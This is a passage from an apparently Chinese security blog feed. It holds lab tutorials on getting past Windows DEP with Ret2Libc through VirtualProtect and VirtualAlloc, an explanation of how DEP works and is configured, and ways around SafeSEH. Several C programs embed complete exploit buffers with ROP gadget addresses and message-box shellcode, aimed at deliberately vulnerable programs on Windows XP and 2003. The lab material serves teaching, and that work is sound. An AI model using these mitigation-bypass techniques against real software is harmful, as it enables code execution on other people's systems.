<p>不知道怎么回事，反正就是到了0x7CBA7181后，这时候使用pop pop pop retn：0x7CBF1A0A<br>于是到了0x&amp;C96F517之后，这时候用jmp esp指令：0x7D1A1E23<br>然后是回跳至shellcode位置，代码\xE9\x27\xFF\xFF\xFF<br>最后用\x90\x90\x90填充</p>
<h3 id="2-Ret2Libc之利用VirtualProctect"><a href="#2-Ret2Libc之利用VirtualProctect" class="headerlink" title="2. Ret2Libc之利用VirtualProctect"></a>2. Ret2Libc之利用VirtualProctect</h3><h4 id="2-1-VirtualProtect简介"><a href="#2-1-VirtualProtect简介" class="headerlink" title="2.1 VirtualProtect简介"></a>2.1 VirtualProtect简介</h4><p>位于Kernel32.dll上的VirtualProtect是为了解决：Optout和AlwaysON模式下所有进程是默认开启DEP，而如果程序自身偶尔需要从堆栈中取指令，就会出错的问题。</p>
<p>其可修改指定内存的属性，包括是否可执行。</p>
<pre><code>
BOOL VirtualProtect{
  LPVOID lpAddress,
  DWORD dwSize,
  DWORD flNewProtect,
  PDWORD lpflOldProtect
};
</code></pre>
lpAddress：要改变属性的内存起始地址
dwSize：要改变属性的内存区域大小
flNewProtect：内存新的属性类型，设为PAGE_EXECUTE_READWRITE(0x40)是该内存也可读可写可执行
lpflOldProtect：内存原始属性类型保存地址

如果能够向下面方式布置，就可让shellcode可执行
<pre><code>
BOOL VirtualProtect{
  shellcode所在内存空间起始地址,
  shellcode大小,
  0x40,
  某个可写地址
};
</code></pre>

<p>注意：</p>
<ol>
<li>由于实验时参数包含0x00，为了方便，将strcpy改为memcoy</li>
<li>对shellcode内存空间起始地址的确定，不同机器会有变化，本实验用巧妙的栈帧构造动态确定shellcode所在内存空间起始地址</li>
</ol>
<h4 id="2-2-实验代码"><a href="#2-2-实验代码" class="headerlink" title="2.2 实验代码"></a>2.2 实验代码</h4><pre><code>
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

char shellcode[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90"
    "\x8A\x17\x84\x7c"            // pop eax retn
    "\x0A\x1A\xBF\x7C"            // pop pop pop retn
    "\xBA\xD9\xBB\x7C"            // 修正EBP
    "\x8B\x17\x84\x7C"            //RETN
    "\x90\x90\x90\x90"            
    "\xBF\x7D\xC9\x77"            // push esp jmp eax(后来成为shellcode起始地址)
    "\xFF\x00\x00\x00"            // 要修改的内存大小
    "\x40\x00\x00\x00"            // 可读可写可执行属性代码
    "\xBF\x7D\xC9\x77"            // push esp jmp eax(后来成为某个可写地址)
    "\x90\x90\x90\x90"
    "\x90\x90\x90\x90"
    "\xE8\x1F\x80\x7C"            // 修改内存属性
    "\x90\x90\x90\x90"
    "\xA4\xDE\xA2\x7C"            // jmp esp
    "\x90\x90\x90\x90"
    "\x90\x90\x90\x90"
    "\x90\x90\x90\x90"
    "\x90\x90\x90\x90"
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";

void test()
{
    char str[176];
    //__asm int 3
    memcpy(str, shellcode, 420);
}

int main()
{
    HINSTANCE hInst = LoadLibrary("shell32.dll");
    char temp[200];
    test();
    return 0;
}

</code></pre>

<h4 id="2-3-实验内容"><a href="#2-3-实验内容" class="headerlink" title="2.3 实验内容"></a>2.3 实验内容</h4><p><b>实验解释</b></p>
<ol>
<li>本实验不启用GS和DEP</li>
<li>test有典型的溢出</li>
<li>覆盖返回地址后，通过Ret2Libc技术，利用VirtualProtect函数将shellcode所在的内存区域设置为可执行模式</li>
<li>通过push esp jmp eax指令序列动态设置VirtualProtect函数中的shellcode所在内存起始地址以及内存原始属性类型保存地址</li>
<li>内存取悦被设置为可执行模式后shellcode就可正常执行了</li>
</ol>
<p><b>实验环境</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows 2003 SP2</td>
<td></td>
</tr>
<tr>
<td>DEP状态</td>
<td>Optout</td>
<td></td>
</tr>
<tr>
<td>编译器</td>
<td>VC 6.0</td>
<td></td>
</tr>
<tr>
<td>编译选项</td>
<td>禁用优化选项</td>
<td></td>
</tr>
<tr>
<td>build版本</td>
<td>debug版本</td>
</tr>
</tbody>
</table>
<p><b>VirtualProtect函数的具体实现</b><br><img src="/images/2017-07-09/virtualprotect.jpg" alt="virtualprotect具体实现"><br>如图，我们可以选择0x7C801FE8作为切入点，按照函数要求布置好栈帧。</p>
<p>由于溢出过程导致EBP被破坏，所以可用PUSH ESP POP EBP ERTN 4来修复。</p>
<p>溢出字符串的起始地址：0x0012FDB0<br>返回地址所在位置: 0x0012FE64<br>修正EBP地址(push esp pop ebp retn 4)：0x7CBBD9BA<br>由于执行完这些指令后，esp就转到了ebp+8。此时状态如下:<br><img src="/images/2017-07-09/ret2libc_vp.jpg" alt="修正EBP后的"></p>
<p>于是可以尝试让ESP向下移动4字节，RETN指令即可，此处用的是0x7C84178B处，最后ESP=0x0012FE74。然后用PUSH ESP RETN/JMP **指令，就可以让esp继续向下移动4字节，并且保证进入shellcode中，0x77C97DBF处的&quot;push esp jmp eax&quot;符合要求。但是shellcode现在还没有执行能力，所以需要修改一下shellcode，在修正EBP之前先pop eax retn。此时的eax对应的是pop pop pop retn。后续都是调试出来的，现如今还无法讲清楚！！！！</p>
<p>然后继续调试，最终得到上面代码中的shellcode。</p>
<h3 id="3-Ret2Libc之利用VirtualAlloc"><a href="#3-Ret2Libc之利用VirtualAlloc" class="headerlink" title="3. Ret2Libc之利用VirtualAlloc"></a>3. Ret2Libc之利用VirtualAlloc</h3><h4 id="3-1-VirtualAlloc简介"><a href="#3-1-VirtualAlloc简介" class="headerlink" title="3.1 VirtualAlloc简介"></a>3.1 VirtualAlloc简介</h4><p>位于kernel32.dll中的VirtualAlloc函数可以申请一段具有可执行属性的内存。于是可以用Ret2Libc的第一跳设置为VirtualAlloc函数地址，然后将shellcode复制到申请的内存空间执行</p>
<p>VirutlAlloc函数说明</p>
<pre><code>LPVOID WINAPI VirtualAlloc{
    __in_opt LPVOID lpAddress,
    __in      SIZE_T dwSize,
    __in      DWORD flAllocationType,
    __in     DWORD flProtect
};
</code></pre>

<p>lpAddress: 申请内存区域的地址，如果参数是NULL，系统将会决定分配内存取悦位置，并且按照64KB向上取整<br>dwSize：申请内存的类型<br>flAlloctionType: 申请内存的类型<br>flProtect：申请内存的访问控制类型，如读写执行等</p>
<h4 id="3-2-实验代码"><a href="#3-2-实验代码" class="headerlink" title="3.2 实验代码"></a>3.2 实验代码</h4><pre><code>
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;

char shellcode[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90"
    "\xBA\xD9\xBB\x7C"            // 修正EBP
    "\xBC\x45\x82\x7C"            // 申请空间
    "\x90\x90\x90\x90"
    "\xFF\xFF\xFF\xFF"            // -1 当前进程
    "\x00\x00\x03\x00"            // 申请空间起始地址
    "\xFF\x00\x00\x00"            // 申请空间大小
    "\x00\x10\x00\x00"            // 申请类型
    "\x40\x00\x00\x00"            // 申请空间访问类型
    "\x90\x90\x90\x90"
    "\x8A\x17\x84\x7C"            // pop eax retn
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x0B\x1A\xBF\x7C"            // pop pop retn
    "\xBA\xD9\xBB\x7C"            // 修正EBP retn 4
    "\x5F\x78\xA6\x7C"            // pop retn
    "\x00\x00\x03\x00"            // 可执行内存空间地址，转入执行用
    "\x00\x00\x03\x00"            // 可执行内存空间地址，复制用
    "\xBF\x7D\xC9\x77"            // push esp jmp eax && 原始shellcode起始地址
    "\xFF\x00\x00\x00"            // shellcode 长度
    "\xAC\xAF\x94\x7C"            // memcpy
    "\x00\x00\x03\x00"            // 一个可以读地址
    "\x00\x00\x03\x00"            // 一个可以读地址
    "\x00\x90\x90\x94"    
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";

void test()
{
    char str[176];
    //__asm int 3
    memcpy(str, shellcode, 500);
}

int main()
{
    HINSTANCE hInst = LoadLibrary("shell32.dll");
    char temp[200];
    test();
    return 0;
}
</code></pre>

<h4 id="3-3-实验内容"><a href="#3-3-实验内容" class="headerlink" title="3.3 实验内容"></a>3.3 实验内容</h4><p><b>实验思路</b></p>
<ol>
<li>不启用GS和SafeSEH</li>
<li>test存在典型的溢出</li>
<li>通过覆盖范返回地址，运用Ret2Libc技术，利用VirtualAlloc函数申请一段具有可执行权限的内存</li>
<li>通过memcpy函数将shellcode复制到VirtualAlloc函数申请的可执行内存空间中</li>
<li>最后在这段可执行的内存空间中执行shellcode，实现DEP绕过</li>
</ol>
<p><b>实验环境</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows 2003 SP2</td>
<td></td>
</tr>
<tr>
<td>DEP状态</td>
<td>Optout</td>
<td></td>
</tr>
<tr>
<td>编译器</td>
<td>VC 6.0</td>
<td></td>
</tr>
<tr>
<td>编译选项</td>
<td>禁用优化选项</td>
<td></td>
</tr>
<tr>
<td>build版本</td>
<td>debug版本</td>
</tr>
</tbody>
</table>
<p><b>VirtualAlloc函数的具体实现</b><br><img src="/images/2017-07-09/virtualalloc.jpg" alt="virtualalloc实现流程"></p>
<p>类似VirtualProtect，我们选择0x7C8245BC（CALL VirtualAllocEx）处作为切入点。</p>
<pre><code>lpAddress=0x00030000
dwSize=0xFF
flAllocationType=0x00001000
flProtect=0x00000040
</code></pre>

<p>当执行到call VirtualAllocEx地址后，发现如图所示的内容：<br><img src="/images/2017-7-09/virtualalloc2.jpg" alt="申请空间之后"><br>从图中可以看出eax=0x00030000，这说明我们申请到了空间。</p>
<p>而memcpy函数位于ntdll.dll，需要三个参数，分别为目的内存起始地址、源内存起始地址、复制长度。其中目的内存地址和复制长度可以直接写在shellcode中，但是源内存起始地址不好确定，所以使用push esp jmp eax指令来填充这个参数。</p>
<p><img src="/images/2017-07-09/memcpy.jpg" alt="memcpy运行结构"></p>
<p>根据图片可以看出， memcpy中的源地址放在了EBP+0xC，目的地址为EBP+0x10，长度为EBP+0x8。所以后面的工作就是将这三个位置进行赋值，采用Ret2Libc的方式，对这些位置进行赋值。</p>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> DEP </tag>
            
            <tag> windows </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[DEP机制的保护原理]]></title>
      <url>/2017/07/09/DEP%E6%9C%BA%E5%88%B6%E7%9A%84%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86/</url>
      <content type="html"><![CDATA[<h3 id="1-DEP简介"><a href="#1-DEP简介" class="headerlink" title="1. DEP简介"></a>1. DEP简介</h3><p>溢出攻击的根源是现代计算机对数据和代码没有明确区分。而重新设计计算机体系结构基本上不可能，所以只能向前兼容的修补来减少溢出带来的损害，DEP（数据执行保护， Data Execution Prevention）设计弥补这一缺陷。</p>
<p>DEP基本原理是将数据所在的页面标识设置为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据基本页面上执行指令，此时CPU会抛出异常，而不是执行恶意指令。</p>
<p>DEP的主要作用是阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。从Windows XP SP2开始有，分为：软件DEP(Software DEP)和硬件DEP(Hardware-enforeced DEP)</p>
<p>软件DEP就是SafeSEH。</p>
<p>硬件DEP：需要CPU支持，AMD称为No-Execute Page-Protection(NX)、Intel称为Execute Disable Bit(XD)。操作系统通过设置内存页的NX/XD属性标记，来指明是否可以从该内存中执行代码。所以页面表(Page Table)中需要加入特殊标识位(NX/XD)，若其为0表示页面允许执行，为1表示不允许执行。</p>
<h3 id="2-判断机器上是否允许DEP"><a href="#2-判断机器上是否允许DEP" class="headerlink" title="2. 判断机器上是否允许DEP"></a>2. 判断机器上是否允许DEP</h3><p>我的电脑-&gt;属性-&gt;系统属性-&gt;高级-&gt;性能-&gt;设置-&gt;性能选项-&gt;数据执行保护。</p>
<p>若CPU不支持硬件DEP，该页面底部会有提示&quot;您的计算机的处理器不支持基于硬件的DEP，但是，Windows可以使用DEP软件帮助保护免受某些类型的攻击&quot;</p>
<h3 id="3-DEP的四种工作状态"><a href="#3-DEP的四种工作状态" class="headerlink" title="3. DEP的四种工作状态"></a>3. DEP的四种工作状态</h3><ol>
<li>Optin：默认仅将DEP保护用于Windows系统组件和服务，对于其他程序不予保护，但用户可以通过应用程序兼容性工具（ACT，Application Compatibility Toolkit）为选定的程序启用DEP，在Vista下边经过/NXcompat选项编译过的程序将自动应用DEP。这种状态可以被应用程序动态关闭，它多用于普通用户版操作系统：Windows XP、Windows Vista、Windows 7</li>
<li>Optout：为排除列表程序外的所有程序和服务启用DEP，用户可以手动在排除列表中指定不启用DEP保护的程序和服务。这种状态可以被动态关闭，多用于服务器版操作系统：windows 2003、windows 2008</li>
<li>AlwaysOn：对所有进程启用DEP的保护，不存在排序列表，这种模式下，DEP不可以被关闭，目前只有64位操作系统上才工作在AlwaysOn模式</li>
<li>AlwaysOff：对所有进程都禁用DEP，在这种模式下，DEP也不能被动态开启，这种模式一般只有在某种特定场合才使用，如DEP干扰到程序的正常运行</li>
</ol>
<h3 id="4-设置DEP"><a href="#4-设置DEP" class="headerlink" title="4. 设置DEP"></a>4. 设置DEP</h3><p><b>机器上设置DEP</b><br>在C:\boot.ini中设置：</p>
<ol>
<li>设置DEP关闭: /execute=optin /fastdetect</li>
<li>设置DEP工作模式： /noexecute=optout /fastdetect</li>
</ol>
<p><b>编译器中设置链接选项</b></p>
<ol>
<li>Visual Studio 2005及其后续版本引入了链接选项/NXCOMPAT，默认为开启</li>
<li>Project-&gt;project Properties-&gt;Configuration Properties-&gt;Linker-&gt;Advanced-&gt;Data Execution Prevention(DEP)中选择是不是使用/NXCOMPAT</li>
</ol>
<p>采用/NXCOMPAT编译的程序会在PE头中设置IMAGE_DLLCHARACTERISTICS_NX_COMPAT标识，该标识通过结构体IMAGE_OPTIONAL_HEADER中DllCharacteristics变量进行体现，当DllCharacteristics设置为0x100表示程序采用/NXCOMPAT编译。</p>
<h3 id="5-DEP的局限性"><a href="#5-DEP的局限性" class="headerlink" title="5. DEP的局限性"></a>5. DEP的局限性</h3><ol>
<li>硬件DEP需要CPU支持</li>
<li>由于兼容性原因Windows不能对所有进程开启DEP保护，否则会出现异常。例如第三方的插件DLL，由于无法确认其是否开启DEP，对这些DLL程序不能贸然开启DEP保护；使用ATL 7.1或者以前版本的程序需要在数据页面上产生可执行代码，这时就不能启用DEP保护，否则会出现异常</li>
<li>/NXCOMPAT编译选项，或者IMAGE_DLLCHARACTERISTICS_NX_COMPAT标识的设置，只对Windows Vista以上的系统有效。也就是说，即使采用了这种链接选项，在某些操作系统上也不会自动启用DEP保护。</li>
<li>DEP工作在Optin和Optout下时，DEP可以被动态关闭或开启。操作系统中某些API函数可控制DEP状态，而它们在早期的操作系统中对这些API函数的调用没设置线坠。</li>
</ol>
]]></content>
      
        <categories>
            
            <category> 安全技术 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> DEP </tag>
            
            <tag> windows </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[test1]]></title>
      <url>/2017/07/09/test/test1/</url>
      <content type="html"><![CDATA[<p>test</p>
]]></content>
      
        <categories>
            
            <category> test </category>
            
        </categories>
        
        
        <tags>
            
            <tag> test1 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[绕过SafeSEH的方法]]></title>
      <url>/2017/07/08/%E7%BB%95%E8%BF%87SafeSEH%E7%9A%84%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<h3 id="1-攻击返回地址绕过SafeSEH"><a href="#1-攻击返回地址绕过SafeSEH" class="headerlink" title="1. 攻击返回地址绕过SafeSEH"></a>1. 攻击返回地址绕过SafeSEH</h3><p>在<a href="/2017/06/22/栈溢出原理与实践/">《栈溢出原理与实践》</a>中有介绍</p>
<h3 id="2-利用虚函数绕过SafeSEH"><a href="#2-利用虚函数绕过SafeSEH" class="headerlink" title="2. 利用虚函数绕过SafeSEH"></a>2. 利用虚函数绕过SafeSEH</h3><p>在<a href="/2017/07/04/绕过GS安全编译的方法/">《绕过GS安全编译的方法》</a>中有范例</p>
<h3 id="3-从堆中绕过SafeSEH"><a href="#3-从堆中绕过SafeSEH" class="headerlink" title="3. 从堆中绕过SafeSEH"></a>3. 从堆中绕过SafeSEH</h3><h4 id="3-1-实验代码"><a href="#3-1-实验代码" class="headerlink" title="3.1 实验代码"></a>3.1 实验代码</h4><pre><code>
#include "stdafx.h"
#include "stdlib.h"
#include "string.h"

char shellcode[] =
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\xB8\x28\x39\x00";

void test(char *input)
{
    char str[200];
    strcpy(str, input);
    int zero = 0;
    zero = 1/zero;
}

void main()
{
    char * buf = (char *)malloc(500);
    //__asm int 3
    strcpy(buf, shellcode);
    test(shellcode);
}
</code></pre>

<h4 id="3-2-实验内容"><a href="#3-2-实验内容" class="headerlink" title="3.2 实验内容"></a>3.2 实验内容</h4><p><b>实验思路：</b></p>
<ol>
<li>首先从堆中申请500字节的空间，用来存放shellcode</li>
<li>函数test存在典型的溢出，通过向str复制超长字符串造成str溢出，进而覆盖程序的SEH信息</li>
<li>用shellcode在堆中的起始位置覆盖异常处理函数地址，然后通过制造除0异常，将程序转入异常处理，进而跳转到堆中的shellcode执行</li>
</ol>
<p><b>实验环境：</b></p>
<table>
<thead>
<tr>
<th></th>
<th>推荐使用环境</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>操作系统</td>
<td>Windows XP SP3</td>
<td>DEP关闭</td>
</tr>
<tr>
<td>编译器</td>
<td>Visual Studio 2008</td>
<td></td>
</tr>
<tr>
<td>编译选项</td>
<td><font color="#f00">禁用优化选项</font></td>
<td></td>
</tr>
<tr>
<td>build版本</td>
<td>release版本</td>
</tr>
</tbody>
</table>
<p><b>得到的数据</b><br>申请的堆空间起始地址:0x003928B8<br>复制给str后的栈起始地址：0x0012FE9C<br>离栈顶最近的SEH处理函数句柄：0x0012FFB0+4</p>
<p><b>于是得到shellcode：</b></p>
<ol>
<li>168字节的谈对对话框机器码</li>
<li>112 * &quot;\x90&quot;</li>
<li>堆起始地址: 0x003928B8</li>
</ol>
<h3 id="4-利用未启用SafeSEH模块绕过SafeSEH"><a href="#4-利用未启用SafeSEH模块绕过SafeSEH" class="headerlink" title="4. 利用未启用SafeSEH模块绕过SafeSEH"></a>4. 利用未启用SafeSEH模块绕过SafeSEH</h3><font color="#f00">如果模块未启用SafeSEH，并且模块不是仅包含中间语言IL，这个异常处理就可以被执行。所以若能找到一个不启用SafeSEH的dll，然后加载之后通过它里面的指令作为跳板实现SafeSEH的绕过。</font>

<h4 id="4-1-实验代码"><a href="#4-1-实验代码" class="headerlink" title="4.1 实验代码"></a>4.1 实验代码</h4><pre><code>
#include "stdafx.h"
#include "string.h"
#include "windows.h"

char shellcode[] = 
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x68"
    "\xf1\x21\x12\x11"
    "\x90\x90\x90\x68\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
    "\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
    "\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
    "\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
    "\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
    "\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
    "\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
    "\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
    "\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
    "\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
    "\x53\xFF\x57\xFC\x53\xFF\x57\xF8";

DWORD MyException(void)
{
    printf("There is an exception");
    getchar();
    return 1;
}

void test(char *input)
{
    char str[200];
    strcpy(str, input);
    int zero = 0;
    __try{
        zero = 1/zero;
    }
    __except(MyException()){}
}

int _tmain(int argc, _TCHAR *argv[])
{
    // Load NO_SafeSEH Module
    HINSTANCE hInst = LoadLibrary(_T("SEH_NOSafeSEH_JUMP.dll"));
    char str[200];
    //__asm int 3
    test(shellcode);
    return 0;
}
</code></pre>

<h4 id="4-2-实验内容"><a href="#4-2-实验内容" class="headerlink" title="4.2 实验内容"></a>4.2 实验内容</h4><p><b>实验思路：</b></p>
<ol>
<li>用VC++ 6.0编译一个不是用SafeSEH的动态链接库SEH_NOSafeSEH_JUMP.DLL，然后由启用SafeSEH的应用程序SEH_NOSafeSEH.EXE去加载</li>
<li>SEH_NOSafeSEH中的test函数存在典型的溢出，通过向str复制超长字符串造成str溢出，进而覆盖程序的SEH信息</li>
